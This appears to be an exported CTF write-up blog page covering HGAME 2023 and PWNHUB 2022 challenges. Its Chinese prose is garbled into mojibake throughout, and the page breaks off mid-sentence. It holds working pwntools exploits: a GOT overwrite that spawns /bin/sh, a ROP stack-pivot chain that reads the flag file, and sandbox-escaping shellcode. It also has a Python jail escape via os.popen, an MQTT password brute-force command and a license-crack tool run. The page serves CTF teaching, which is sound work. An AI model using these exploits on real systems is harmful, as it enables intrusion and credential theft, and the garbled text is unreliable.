‡å‡†è¾“å‡ºï¼Œæ­¤æ—¶å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤å¹¶ä¸”çœ‹å¾—åˆ°è¾“å‡ºäº†ã€‚ 123456789from pwn import *r=remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31066)b4ckd0or=0x401176pl=&#x27;a&#x27;*(0x10+8)+p64(b4ckd0or)r.send(pl)r.interactive() â€‹ choose_the_seat å…”å…”åœ¨ä¹°é«˜é“ç¥¨æ—¶æƒ³è¦é€‰ä¸€ä¸ªå¥½åº§ä½ã€‚ HINTS: æ•°ç»„ä¸‹æ ‡çš„æ£€æŸ¥å¥½åƒå°‘äº†ç‚¹ä¸œè¥¿ ç”±ä»£ç é€»è¾‘çŸ¥å¯ä»¥å†™å…¥bssæ®µï¼Œåªé™åˆ¶äº†ä¸Šé™æœªé™åˆ¶ä¸‹é™ï¼Œä½¿ç”¨è´Ÿæ•°å¯æ‰“GOTè¡¨å†…å®¹ã€‚è¦†ç›– exit() çš„GOTè¡¨ä¸º main() ä½¿ç¨‹åºå¾ªç¯ï¼Œå†è¦†ç›– puts() çš„GOTè¡¨æ³„éœ² puts() åœ°å€è®¡ç®—å¾—åˆ°libcåŸºåœ°å€ï¼Œæœ€åè¦†ç›– puts() çš„GOTè¡¨ä¸º system(&quot;/bin/sh\\x00&quot;)ã€‚ 123456789101112131415161718192021222324252627282930from pwn import *r=remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30831)elf=ELF(&#x27;./vuln&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)main=elf.sym.mainr.recvuntil(&#x27;choose one.\\n&#x27;)r.sendline(&#x27;-6&#x27;)r.recvline()r.send(p64(main))r.recvuntil(&#x27;choose one.\\n&#x27;)r.sendline(&#x27;-9&#x27;)r.recvline()r.send(&#x27;a&#x27;*8)r.recvuntil(&#x27;a&#x27;*8)puts_addr=u64(r.recv(6)+&#x27;\\x00&#x27;*2)print(hex(puts_addr))base=puts_addr-libc.sym.putsprint(hex(base))r.recvuntil(&#x27;choose one.\\n&#x27;)r.sendline(&#x27;-9&#x27;)r.recvline()r.send(&#x27;/bin/sh\\x00&#x27;+p64(base+libc.sym.system))r.interactive() â€‹ orw HINTS: æ ‡é¢˜å°±æ˜¯è€ƒç‚¹æï¼Œæ²¡æ€è·¯çš„å¯ä»¥æŒ‰ç…§æ ‡é¢˜æŸ¥ä¸€æŸ¥ è§‰å¾—æº¢å‡ºçš„ä¸å¤Ÿå¤šï¼Ÿé‚£å°±å…ˆæ‰¾ä¸ªåœ°æ–¹æŠŠROPé“¾å†™è¿›å»ï¼Œå†æŠŠæ ˆè¿ç§»è¿‡å»æ‰§è¡Œå§ æ ‡é¢˜è¡¨æ˜éœ€orwï¼Œä½†å¼€å¯äº†æ²™ç›’ç¦ç”¨äº† execve()/execveat()ï¼Œread() è¯»çš„å­—èŠ‚æ•°è¶³ä»¥ç”¨ROPé“¾æ³„éœ²libcï¼Œä½†æº¢å‡ºå­—èŠ‚0x28ä¸è¶³ä»¥æ‰§è¡Œorwï¼Œéœ€å…ˆåšæ ˆè¿ç§»åï¼Œå†æ‰§è¡Œorwã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *r=remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30153)context(arch=&#x27;amd64&#x27;)elf=ELF(&#x27;./vuln&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)pop_rdi=0x401393ret=0x40101amain=elf.sym.mainputs_plt=elf.plt.putsputs_got=elf.got.putsr.recvline()pl=b&#x27;a&#x27;*(0x100+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(elf.sym.main)r.send(pl)leak=u64(r.recv(6)+b&#x27;\\x00&#x27;*2)print(hex(leak))base=leak-libc.sym.putsprint(hex(base))libc.address=basedef findGadget(gadget): return next(libc.search(asm(gadget),executable=True))bss_rop=0x404048bss_flag=0x404038leave_ret=0x4012EEr.recvline()r.recvline()pl=b&#x27;a&#x27;*(0x100)+p64(bss_rop)+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(bss_rop)+p64(libc.sym.read)+p64(leave_ret)r.send(pl)pl=b&#x27;a&#x27;*8+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(bss_flag)+p64(libc.sym.read)pl+=p64(pop_rdi)+p64(bss_flag)+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(0)+p64(libc.sym.open) # fd=open(&#x27;./flag&#x27;,0) #3pl+=p64(pop_rdi)+p64(3)+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(bss_rop)+p64(findGadget(&#x27;pop rdx;ret&#x27;))+p64(0x30)+p64(libc.sym.read) # read(3,buf,0x100)pl+=p64(pop_rdi)+p64(1)+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(bss_rop)+p64(findGadget(&#x27;pop rdx;ret&#x27;))+p64(0x30)+p64(libc.sym.write) # puts(buf)r.send(pl)r.send(b&#x27;flag&#x27;)r.interactive() â€‹ simple_shellcode HINTS: ä¸€æ¬¡readä¸å¤Ÿå¤šï¼Œä¸ºä»€ä¹ˆä¸å†è¯»ä¸€æ¬¡å‘¢ï¼Ÿ åˆçœ‹ä»£ç åƒret2shellcodeï¼Œä½†å¼€å¯äº†æ²™ç›’ç¦ç”¨äº† execve()/execveat()ï¼Œè€Œä¸” read() åªèƒ½è¯»å…¥0x10å­—èŠ‚ã€‚ éœ€è¦å†™å…¥shellcodeï¼Œä½†éœ€å…ˆè°ƒç”¨ä¸€æ¬¡ read() ä»¥è¯»å–æ›´å¤šçš„å­—èŠ‚ï¼Œå†æ‰§è¡Œorwå³å¯ã€‚ 123456789101112131415161718192021222324from pwn import *r=remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31331)context(arch=&#x27;amd64&#x27;)r.recvline()pl = asm(&#x27;&#x27;&#x27; xor rdi,rdi mov rsi,rdx mov rdx,0x100 syscall &#x27;&#x27;&#x27;)print(len(pl))r.send(pl)pl = shellcraft.open(&#x27;./flag&#x27;)pl += shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,0x100)pl += shellcraft.write(1,&#x27;rsp&#x27;,0x100)pl = asm(pl)print(len(pl))print(len(asm(shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,0x100))))r.send(&#x27;a&#x27;*0xf+pl)r.interactive() â€‹ BlockchainCheckin é¢˜ç›®ä¸­ç»™å‡ºäº†ä¸‰ä¸ªç«¯å£ï¼Œåˆ†åˆ«æ˜¯ RPCã€æ°´é¾™å¤´ã€é¢˜ç›®äº¤äº’ç«¯ã€‚ ç”±äºé¶æœºç«¯å£éšæœºï¼Œéœ€è¦é€‰æ‰‹è‡ªè¡Œå°è¯•ã€‚ å…¶ä¸­ï¼Œæµè§ˆå™¨å¯ç›´æ¥è®¿é—®çš„æ˜¯æ°´é¾™å¤´ï¼Œæµè§ˆå™¨ç›´æ¥è®¿é—®æŠ¥ 403 çš„æ˜¯ RPCï¼Œæµè§ˆå™¨æ— æ³•è®¿é—®çš„æ˜¯é¢˜ç›®äº¤äº’ç«¯ï¼Œéœ€ä½¿ç”¨ nc è¿æ¥ã€‚ ncè¿æ¥ï¼Œé€‰1ç”Ÿæˆè´¦å·ï¼Œåœ¨æ°´é¾™å¤´é‡Œè½¬è´¦åï¼Œé€‰2ç”Ÿæˆåˆçº¦åœ°å€ï¼Œé€‰4æŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122232425// contracts/checkin.sol// SPDX-License-Identifier: MITpragma solidity 0.8.17;contract Checkin &#123; string greeting; constructor(string memory _greeting) &#123; greeting = _greeting; &#125; function greet() public view returns (string memory) &#123; return greeting; &#125; function setGreeting(string memory _greeting) public &#123; greeting = _greeting; &#125; function isSolved() public view returns (bool) &#123; string memory expected = &quot;HelloHGAME!&quot;; return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting)); &#125;&#125; ä»£ç é€»è¾‘ä¸ºé€šè¿‡ setGreeting() ä¼ å…¥å­—ç¬¦ä¸²ä½¿å¾— isSolved() è¿”å› trueï¼Œä¼ å…¥çš„å­—ç¬¦ä¸²ä¸º HelloHGAME! å³æ»¡è¶³æ¡ä»¶ã€‚ å°è¯•åœ¨Remixä¸­æ”»å‡»å·²ç”Ÿæˆçš„åˆçº¦åœ°å€æ²¡æ‰“é€šï¼Œé—®å‡ºé¢˜äººçŸ¥å¯¹Remixç¯å¢ƒåšäº†é™åˆ¶ï¼ˆé˜²ä½œå¼Šï¼‰ï¼Œéœ€é‡‡ç”¨web3pyè„šæœ¬æ–¹å¼è¿›è¡Œæ”»å‡»ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940from web3 import Web3, HTTPProviderimport json# RPCç½‘ç»œç¯å¢ƒrpc = &#x27;&#x27;w3 = Web3(HTTPProvider(rpc))# æ£€æµ‹è¿é€šæ€§print(w3.isConnected())# Metamaskåœ°å€myAccount = &#x27;&#x27;# åˆçº¦åœ°å€contractAddress = &#x27;&#x27;# Metamaskç§é’¥private_key = &#x27;&#x27;# abiåœ¨Remixä¸Šç¼–è¯‘.solæºç åè·å–abi = json.loads(&#x27;[&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;greet&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;isSolved&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;bool&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;bool&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;name&quot;: &quot;setGreeting&quot;,&quot;outputs&quot;: [],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;]&#x27;)# è·å–åˆçº¦contract = w3.eth.contract(address=contractAddress, abi=abi)nonce = w3.eth.getTransactionCount(Web3.toChecksumAddress(myAccount))# åˆçº¦äº¤æ˜“å®šä¹‰ï¼Œè°ƒç”¨å‡½æ•°setGreeting# äº‹å…ˆä¿è¯myAccountæœ‰è¶³å¤Ÿetheræ”¯ä»˜gas*gasPrice+valueï¼Œä»æ°´é¾™å¤´è·å–ethertx = contract.functions.setGreeting(&#x27;HelloHGAME!&#x27;).buildTransaction(&#123; &#x27;from&#x27;: Web3.toChecksumAddress(myAccount), &#x27;gasPrice&#x27;: w3.eth.gasPrice, &#x27;nonce&#x27;: nonce, &#x27;value&#x27;: 0, &#125;)gas = w3.eth.estimate_gas(tx)tx[&#x27;gas&#x27;] = gasprint(tx)# äº¤æ˜“æ‰§è¡Œsigned_txn = w3.eth.account.signTransaction(tx, private_key)print(signed_txn.hash)print(signed_txn.rawTransaction)tmp = w3.eth.sendRawTransaction(signed_txn.rawTransaction.hex()) æœ€åncè¿æ¥ï¼Œé€‰4è·å–flagã€‚ â€‹ IotHelp marvin å…”å…”å‘ç°å”®ç¥¨çš„marvinåªä¼šåå‡ºä¸‰ä¸ªç™½å¤´ å†³å®šå»ä¿®ä¸€ä¿®marvin(-30) HINTS: Hint: SPI ç»™å®šçš„æ˜¯sræ–‡ä»¶ï¼Œè§£å‹ï¼Œæ ¹æ®æ–‡ä»¶å†…å®¹æœç´¢çŸ¥ä¸ºé€»è¾‘åˆ†æå¥—ä»¶sigrokç”Ÿæˆçš„æ–‡ä»¶ã€‚ ä½¿ç”¨PulseViewå·¥å…·æ‰“å¼€sræ–‡ä»¶ï¼Œåœ¨D0/D1/D2æœ‰æ•°æ®ï¼Œå‚è€ƒ 2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ› Whatâ€™s In The Bits ä»¥åŠåæ”¾çš„æç¤ºï¼ŒçŸ¥ç¬¦åˆSPIåè®®ç‰¹å¾ã€‚ é€‰æ‹©SPIè§£ç å™¨ï¼Œclocké€‰D0ï¼Œè¾“å…¥é€‰D2ï¼Œå¯¼å‡ºæ‰€æœ‰è§£ç çš„01å­—ç¬¦ï¼š 00110100001100111011000010110110101100101011110110011010001011111001101010111010000110100011011100110011101100101010111110101001101110000001100010111110 å»æ‰å¤´ä½0ï¼Œ8ä½ä¸€ç»„å¯è¿˜åŸå­—ç¬¦ä¸² hgame&#123;4_5t4nge_Sp1&gt;ï¼Œä¿®æ­£æœ€åä¸€ä½è¡¥è¶³ä¸€ä½1ï¼Œå¾— hgame&#123;4_5t4nge_Sp1&#125;ã€‚ â€‹ Help the uncle who canâ€™t jump twice å…”å…”åœ¨è½¦ç«™é—¨å£çœ‹åˆ°ä¸€å¼ å¡‘æ–™å‡³å­,ä¸Šè¾¹åç€ä¸€ä¸ªè‡ªç§°Vçš„ç”·äºº.ä»–å¸Œæœ›ä½ èƒ½å¸®ä»–ç™»ä¸Šä»–çš„å¤§å· Vergil å»é‚£è¾¹çš„å…¬å‘Šæ ä¸Šåº·åº·Neroæ‰‹ä¸Šçš„YAMATOæ€ä¹ˆæ ·äº† broker:117.50.177.240:1883 HINTS: Hint: mqtt æ ¹æ®brokeråœ°å€çŸ¥ä½¿ç”¨çš„MQTTåè®®ï¼Œå‚è€ƒ ç‰©è”ç½‘å®‰å…¨å®æˆ˜ä»é›¶å¼€å§‹-MQTTåè®®åˆ†æ å®‰è£…mqtt-pwnã€‚ ä½¿ç”¨å‘½ä»¤çˆ†ç ´ Vergil çš„å¯†ç ï¼ŒæŒ‡å®šç»™å®šçš„å¯†ç æœ¬ï¼š bruteforce --host 117.50.177.240 --port 1883 -u Vergil -pf password.txt å¾—åˆ°ç»“æœï¼š [+] Found valid credentials: Vergil:power ä¸‹è½½brokerè¿æ¥å·¥å…·MQTT.fxï¼Œä½¿ç”¨è´¦å¯† Vergil/power ç™»å½•brokerï¼Œåœ¨è®¢é˜…å¤„è¾“å…¥ä¸»é¢˜ Nero/YAMATOï¼Œæ”¶åˆ°åŒ…å«flagçš„ä¿¡æ¯ï¼šhgame&#123;mqtt_1s_p0w3r&#125;ã€‚ â€‹","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"PWNHUB2022å†¬å­£èµ›","slug":"match-PWNHUB2022å†¬å­£èµ›","date":"2022-12-18T15:20:03.000Z","updated":"2022-12-20T10:40:05.641Z","comments":true,"path":"2022/12/18/match-PWNHUB2022å†¬å­£èµ›/","permalink":"https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/","excerpt":"","text":"â€‹ âœŒï¸ç«èµ›æ—¶é—´ï¼š12æœˆ17æ—¥ 10:00â€”12æœˆ18æ—¥ 22:00âœŒï¸å¾—åˆ†è§„åˆ™ï¼šæ¯”èµ›é‡‡ç”¨åŠ¨æ€åˆ†æ•°åˆ¶åº¦ ï¼Œæ¯é“é¢˜ç›®çš„åˆ†å€¼å°†æ ¹æ®è§£å‡ºé˜Ÿä¼çš„æ•°é‡è¿›è¡ŒåŠ¨æ€è®°åˆ†ã€‚âœŒï¸é¢˜ç›®ç±»å‹ï¼šWebã€Pwnã€Reverseã€Miscã€Cryptoç­‰ Rank: 9 miscåäº•è§‚å¤©pythoné€ƒé€¸ï¼Œåˆ©ç”¨ eval(input()) ç»•è¿‡å…³é”®å­—é»‘åå•ï¼š 12eval(input())__import__(&quot;os&quot;).popen(&quot;env&quot;).read() â€‹ è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†xrayè¯ä¹¦ä¿¡æ¯è§£æï¼Œå‚è€ƒGithubé¡¹ç›® xray-crackï¼Œå°† main.go ç¼–è¯‘ï¼š go build -o goxray main.go å†è¿è¡Œï¼š ./goxray -p xray-license.lic å³å¯å¾—åˆ°è¯ä¹¦å†…å®¹æ•°æ®ï¼š 123version ok: 2license parsed: &#123;bc5d237dc9b7470e94b61687c19e62fc 3270cdada4eb4a809d25ff4820d5a1f7 ç‹å¾·å‘ COMMUNITY-ADVANCED 1320981071 1645539742&#125;crypto/rsa: verification error æ•…flagä¸ºuser_idï¼šflag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;ã€‚ â€‹ cryptoå¤§æ‚çƒ© 12345678910111213141516171819202122232425262728293031323334353637383940# sagefrom Crypto.Util.number import *from gmpy2 import *from random import *padding = lambda num, bit_len: (num &lt;&lt; (512 - bit_len)) + getrandbits(512 - bit_len)flag = b&#x27;**************************************&#x27;m1, m2 = bytes_to_long(flag[:19]), bytes_to_long(flag[19:])p = next_prime(padding(m1, m1.bit_length()))q = next_prime(padding(m2, m2.bit_length()))n = p * qe = getPrime(128)d = inverse(e, (p - 1) * (q-1))a, b = e &amp; 0x3ffffffffff, e &gt;&gt; 42N = getPrime(128)E = EllipticCurve(Zmod(N), [a, b])NN = getPrime(1024)S = inverse(getPrime(128), NN) * inverse(getPrime(128), NN)d1 = d &gt;&gt; 512d2 = d &amp; (1 &lt;&lt; 512) - 1enc1 = S * d1 % NNenc2 = S * d2 % NNprint(&#x27;n =&#x27;, n)print(&#x27;a =&#x27;, a)print(&#x27;N =&#x27;, N)print(&#x27;POINT =&#x27;, E.lift_x(996))print(&#x27;enc1 =&#x27;, enc1)print(&#x27;enc2 =&#x27;, enc2)print(&#x27;NN =&#x27;, NN)# n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749# a = 1755716071599# N = 236038564943567983056828121309828109017# POINT = (996 : 151729833458737979764886336489671975339 : 1)# enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356# enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204# NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347 $a,b$ åˆ†åˆ«ä¸º $e$ çš„ä½42ä½å’Œé«˜(128-42)ä½ï¼Œæœ‰ $e=2^{42}b+a$ã€‚ $a$ å·²çŸ¥ï¼Œæ ¹æ®ç‚¹ $P=(P_x,P_y)$ åŠæ¤­åœ†æ›²çº¿ $E$ æ–¹ç¨‹ $y^2 \\equiv x^3+ax+b \\pmod N$ï¼Œä»£å…¥æ±‚è§£ $b$ã€‚ åŒç†ï¼Œ$d=2^{512}d_1+d_2$ï¼Œå›  $c_1 = Sd_1 \\bmod Nâ€™,c_2 = Sd_2 \\bmod Nâ€™$ï¼Œåˆ†åˆ«ä½¿ç”¨ç±»ä¼¼Wiener Attackçš„æ ¼å­æ±‚è§£ $d_1,d_2$ã€‚ æœ€åå·²çŸ¥ $e,d,n$ï¼Œåˆ†è§£ $n$ å¾— $p,q$ï¼Œflagä¸¤éƒ¨åˆ†åˆ†åˆ«åœ¨ $p,q$ ä¸­ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243import randomimport gmpy2def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1: p = gmpy2.gcd(x-1, n) return (p, n//p)n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749a = 1755716071599N = 236038564943567983056828121309828109017Px, Py = (996, 151729833458737979764886336489671975339)enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347F = Zmod(N)b = int(F(Py^2 - (Px^3 + a*Px)))e = 2^42 * b + aL1 = Matrix(ZZ, [[enc1, 2^256],[NN, 0]])d1 = -L1.LLL()[0][0]L2 = Matrix(ZZ, [[enc2, 2^256],[NN, 0]])d2 = -L2.LLL()[0][0]d = 2^512 * d1 + d2p, q = divide_pq(e, d, n)flag1 = bytes.fromhex(hex(p&gt;&gt;(512-19*8+2))[2:])flag2 = bytes.fromhex(hex(q&gt;&gt;(512-19*8+1))[2:])print(flag1)print(flag2)# b&#x27;4cb201080d8b240774&#125;&#x27;# b&#x27;flag&#123;e89f47939d1243&#x27; flagï¼šflag&#123;e89f47939d12434cb201080d8b240774&#125;ã€‚ â€‹ pwnjustJSjså‘½ä»¤æ‰§è¡Œå³å¯ï¼š eval(read(&quot;/flag&quot;)) åœ¨ eval() çš„æŠ¥é”™æ–‡å­—ä¸­å¾—åˆ°flagï¼š 12345undefined:1: SyntanError: Unexpected token &#x27;&#123;&#x27;flag&#123;5cff08f23eb37451bd84effb99275794&#125; ^SyntanError: Unexpected token &#x27;&#123;&#x27; at input.js:1:6 â€‹ ppcTcp Show Description ä¼—æ‰€å‘¨çŸ¥ï¼ŒWireshark å¸¦æœ‰ä¸€ä¸ª follow tcp stream åŠŸèƒ½ï¼Œå¯ä»¥å±•ç¤º TCP æµé‡çš„æ¥å›é€šä¿¡ã€‚ ä¸ºäº†ç»™æŸäº§å“å¢åŠ æ˜¾ç¤º TCP æ¥å›æµé‡çš„åŠŸèƒ½ï¼Œä½ å‡†å¤‡è¯»å–æµé‡æ–‡ä»¶æ¥ç”Ÿæˆç±»ä¼¼çš„å±•ç¤ºæ•ˆæœã€‚ Input ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ•°å­— Nï¼Œè¡¨ç¤ºæ¥ä¸‹æ¥æœ‰ N è¡Œã€‚ æ¥ä¸‹æ¥ N è¡Œï¼Œæ¯ä¸€è¡Œéƒ½ç”±ä¸¤éƒ¨åˆ†ç»„æˆã€‚é¦–å…ˆæ˜¯ä¸€ä¸ªæ•°å­— Dï¼Œæ•°å­— D ä¸º 0 è¡¨ç¤ºä¸ºå®¢æˆ·ç«¯å‘ç»™æœåŠ¡å™¨çš„æ–¹å‘ï¼Œæ•°å­— D ä¸º 1 è¡¨ç¤ºæœåŠ¡å™¨å‘ç»™å®¢æˆ·ç«¯æ–¹å‘ï¼›ç„¶åç¬¬äºŒéƒ¨åˆ†æ˜¯ä¸€ä¸ª base64 å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç¼–ç åçš„æµé‡å…·ä½“å†…å®¹ã€‚ Output å¯¹äºæ¯ä¸€è¡Œçš„æµé‡åŒ…ï¼Œç”Ÿæˆç±»ä¼¼ wireshark çš„ hexdump æ¨¡å¼çš„æµé‡å±•ç¤ºã€‚å…¶ä¸­ï¼š æ¯è¡Œå¼€å¤´éƒ½æ˜¯ 8 ä½ hexï¼Œè¡¨ç¤ºå½“å‰è¿™ä¸€è¡Œåœ¨è¯¥æµé‡åŒ…çš„åç§»ã€‚ ä¸¤ä¸ªç©ºæ ¼ä¹‹åï¼Œæ˜¯è¯¥æµé‡åŒ…çš„ hex dump å†…å®¹ï¼Œæ¯è¡Œ 16 ä¸ª hex dumpã€‚ hex dump ä¹‹åï¼Œæ˜¯è¯¥æµé‡åŒ…å†…å®¹çš„å­—ç¬¦æ˜¾ç¤ºï¼Œå¯¹äºå¯è§å­—ç¬¦(32 ~ 126)ï¼Œæ˜¾ç¤ºå­—ç¬¦æœ¬èº«ï¼Œå¯¹äºä¸å¯è§å­—ç¬¦ï¼Œæ˜¾ç¤ºä¸€ä¸ª . å· å¯¹äºæ— æ³•å‡‘é½ 16 ä¸ª hex çš„è¡Œï¼Œå…¶ä¸è¶³çš„å†…å®¹ç”¨ç©ºæ ¼ä»£æ›¿ã€‚ç¡®ä¿æ¯ä¸€è¡Œçš„æ€»é•¿åº¦æ˜¯ç›¸ç­‰çš„ã€‚ æ ¹æ®ä¸‹é¢çš„æ ·ä¾‹ï¼Œä»”ç»†å¤„ç†ç©ºæ ¼çš„æ•°é‡ã€‚ æŒ‰ç…§è¾“å‡ºè¦æ±‚æ ¼å¼åŒ–è§£æå³å¯ï¼š 1234567891011121314151617181920212223242526from base64 import b64decodefrom math import ceilN = int(input())for c in range(N): k, b = input().split(&#x27; &#x27;) h = list(b64decode(b.encode())) if k == &#x27;0&#x27;: for i in range(ceil(len(h)/16)): ind = hex(i*16)[2:].rjust(8,&#x27;0&#x27;) hh = h[16*i:16*(i+1)] hh1 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[:8]] + [&#x27; &#x27;]*(8-len(hh[:8]))) hh2 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[8:]] + [&#x27; &#x27;]*(8-len(hh[8:]))) ch1 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[:8]]).ljust(8,&#x27; &#x27;) ch2 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[8:]]).ljust(8,&#x27; &#x27;) print(f&#x27;&#123;ind&#125; &#123;hh1&#125; &#123;hh2&#125; &#123;ch1&#125; &#123;ch2&#125;&#x27;) else: for i in range(ceil(len(h)/16)): ind = hex(i*16)[2:].rjust(8,&#x27;0&#x27;) hh = h[16*i:16*(i+1)] hh1 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[:8]] + [&#x27; &#x27;]*(8-len(hh[:8]))) hh2 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[8:]] + [&#x27; &#x27;]*(8-len(hh[8:]))) ch1 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[:8]]).ljust(8,&#x27; &#x27;) ch2 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[8:]]).ljust(8,&#x27; &#x27;) print(f&#x27; &#123;ind&#125; &#123;hh1&#125; &#123;hh2&#125; &#123;ch1&#125; &#123;ch2&#125;&#x27;) â€‹ Fight Clones Description Neo è¢« Smith çš„åˆ†èº«ä»¬åŒ…å›´äº†ï¼ä»–éœ€è¦å‡»è´¥ä»–ä»¬ï¼ æ¯ä¸€ä¸ª Smith éƒ½æœ‰è‡ªå·±çš„æ”»å‡»å€¼å’Œç”Ÿå‘½å€¼ã€‚åœ¨å—åˆ°æ”»å‡»ä¹‹å‰ï¼Œä»–ä»¬éƒ½å¯ä»¥æŒç»­æ”»å‡» Neoã€‚ Neo ä¹Ÿæœ‰è‡ªå·±çš„æ”»å‡»å€¼å’Œç”Ÿå‘½å€¼ï¼Œè™½ç„¶æ¯” Smith é«˜å¾—å¤šï¼Œä½†æ˜¯ Neo ä¸€æ¬¡ä¹Ÿåªèƒ½æ”»å‡»ä¸€ä¸ª Smithï¼ˆæ˜¯çš„ä»–æ²¡æœ‰ AOEï¼‰ã€‚ Neo éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæœ€ä¼˜çš„æ”»å‡»ç­–ç•¥ï¼Œä»¥ä¿è¯è‡ªå·±ç”Ÿå‘½å€¼è¢«å‡ä¸ºé›¶ä¹‹å‰å‡»å€’æ‰€æœ‰ Smithã€‚ Neo çš„ç”Ÿå‘½å€¼æ˜¯ç¡®å®šçš„ï¼ŒOracle ä¹‹å‰å‘Šè¯‰è¿‡ä»–ã€‚ä½†æ˜¯ä»–éœ€è¦çŸ¥é“è‡ªå·±çš„æ”»å‡»å€¼æ˜¯å¦èƒ½å¤Ÿç¡®ä¿æ‰“èµ¢ Smith ä»¬ã€‚ ä½ èƒ½å¸® Neo è®¡ç®—å‡ºä»–æ‰€éœ€è¦çš„æœ€å°æ”»å‡»å€¼ä¹ˆï¼Ÿ Input ç¬¬ä¸€è¡Œè¾“å…¥ä¸¤ä¸ªæ•´æ•° $N H$ ($1 \\le N \\le 1000,1 \\le H \\le 1000000$)ï¼Œè¡¨ç¤ºæ€»å…±æœ‰ $N$ ä¸ª Smithï¼Œä»¥åŠ Neo çš„ç”Ÿå‘½å€¼ä¸º $H$ã€‚ æ¥ä¸‹æ¥ $N$ è¡Œï¼Œè¡¨ç¤º $N$ ä¸ª Smith çš„å±æ€§ï¼Œæ¯è¡Œæ 